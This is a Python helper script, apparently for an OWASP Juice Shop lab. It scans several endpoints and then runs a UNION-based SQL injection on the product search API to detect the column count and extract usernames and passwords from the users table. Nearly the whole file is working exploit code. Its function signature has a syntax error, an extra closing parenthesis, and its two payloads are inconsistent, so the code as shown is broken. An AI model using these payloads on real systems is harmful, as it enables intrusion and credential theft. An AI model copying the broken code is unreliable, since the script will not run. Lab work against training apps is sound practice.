#!/usr/bin/env python3
"""
lab3_helper.py
Recon + SQLi helper for OWASP Juice Shop lab
Author: Your Name
"""

import requests
from bs4 import BeautifulSoup
import urllib3
import argparse
from colorama import Fore, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check_endpoint(session, base_url, path, expect_json=False):
    url = f"{base_url.rstrip('/')}/{path.lstrip('/')}"
    try:
        resp = session.get(url, verify=False, timeout=5)
        if resp.status_code == 200:
            print(f"{Fore.GREEN}[+] Found: {url} (HTTP 200){Style.RESET_ALL}")
            if expect_json:
                try:
                    print(resp.json())
                except Exception:
                    print(resp.text[:200])
            else:
                print(resp.text[:200], "...\n")
        else:
            print(f"{Fore.YELLOW}[-] {url} returned {resp.status_code}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error checking {url}: {e}{Style.RESET_ALL}")


def recon(base_url):
    print(f"{Fore.CYAN}[*] Starting Recon on {base_url}{Style.RESET_ALL}")
    session = requests.Session()
    check_endpoint(session, base_url, "/metrics")
    check_endpoint(session, base_url, "/ftp")
    check_endpoint(session, base_url, "/scoreboard")
    check_endpoint(session, base_url, "/privacy-security", expect_json=False)


def detect_column_count(base_url, payload_base="orange")):
    """
    Send UNION SELECT with increasing number of NULLs until valid.
    """
    print(f"{Fore.CYAN}[*] Detecting column count for UNION SELECT...{Style.RESET_ALL}")
    session = requests.Session()
    for cols in range(1, 11):
        payload = f"{payload_base} UNION SELECT " + ",".join(["NULL"] * cols) + "--"
        try:
            r = session.get(f"{base_url}/rest/products/search", params={"q": payload}, verify=False, timeout=5)
            if r.status_code == 200 and "error" not in r.text.lower():
                print(f"{Fore.GREEN}[+] Likely column count: {cols}{Style.RESET_ALL}")
                return cols
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
    print(f"{Fore.RED}[-] Could not determine column count up to 10{Style.RESET_ALL}")
    return None


def extract_users(base_url, col_count):
    """
    Extract username,password using UNION SELECT once col_count is known.
    """
    print(f"{Fore.CYAN}[*] Extracting users via SQLi...{Style.RESET_ALL}")
    nulls = ["NULL"] * col_count
    # Put username and password in first two visible columns
    nulls[0] = "username"
    nulls[1] = "password"
    payload = f"')) UNION SELECT {','.join(nulls)} FROM users--"
    session = requests.Session()
    try:
        r = session.get(f"{base_url}/rest/products/search", params={"q": payload}, verify=False, timeout=5)
        if r.status_code == 200:
            try:
                data = r.json()
                for item in data.get("data", []):
                    print(f"{Fore.GREEN}{item}{Style.RESET_ALL}")
            except Exception:
                print(r.text[:300])
        else:
            print(f"{Fore.YELLOW}[-] Extraction failed: HTTP {r.status_code}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(description="Lab 3 Juice Shop Recon + SQLi Helper")
    parser.add_argument("base_url", help="Base URL of Juice Shop (e.g., http://localhost:3000)")
    parser.add_argument("--recon", action="store_true", help="Run recon scan on common endpoints")
    parser.add_argument("--sqli", action="store_true", help="Run SQLi column count detection + extraction")
    args = parser.parse_args()

    if args.recon:
        recon(args.base_url)

    if args.sqli:
        col_count = detect_column_count(args.base_url)
        if col_count:
            extract_users(args.base_url, col_count)


if __name__ == "__main__":
    main()
